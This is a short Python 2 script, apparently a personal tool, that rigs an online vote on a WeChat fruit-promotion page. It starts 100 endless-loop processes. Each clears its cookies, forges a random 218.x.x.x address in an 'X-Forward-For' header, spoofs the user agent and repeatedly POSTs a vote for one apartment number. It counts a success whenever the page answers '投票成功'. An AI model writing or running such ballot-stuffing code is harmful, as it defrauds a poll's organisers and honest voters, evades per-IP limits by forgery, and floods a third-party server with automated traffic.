# -*- coding=utf8 -*-
__author__ = 'cubelin'

import cookielib
import urllib2
import urllib
import multiprocessing
import random
import traceback


def submit(ip):
    try:
        post_data = urllib.urlencode(
            {"region": "qy", "apartment_num": "9"})
        #print post_data
        path = "http://activity.wexinfruit.com/140303_wx"

        req = urllib2.Request(path, post_data)
        conn = urllib2.urlopen(req)
        txt = conn.read()
        if txt.find("投票成功") > 0:
            print "Succeed, IP Address is: " + ip
        else:
            print "Failed  " + str(random.randint(1, 50000))

    except:
        exstr = traceback.format_exc()
        print exstr
        # pass

if __name__ == "__main__":

    def run(mid):
        print "process %d start" % mid
        while True:
            cj = cookielib.CookieJar()
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
            ip = '218.%s.%s.%s' % (str(random.randint(1, 254)), str(random.randint(1, 254)), str(random.randint(1, 254)))
            opener.addheaders = [('User-agent', 'Opera/9.23'),
                                 ('X-Forward-For', ip)]
            urllib2.install_opener(opener)
            #print "cookie clear"
            submit(ip)
    for mid in range(100):
        p = multiprocessing.Process(target=run, args=(mid,))
        p.start()
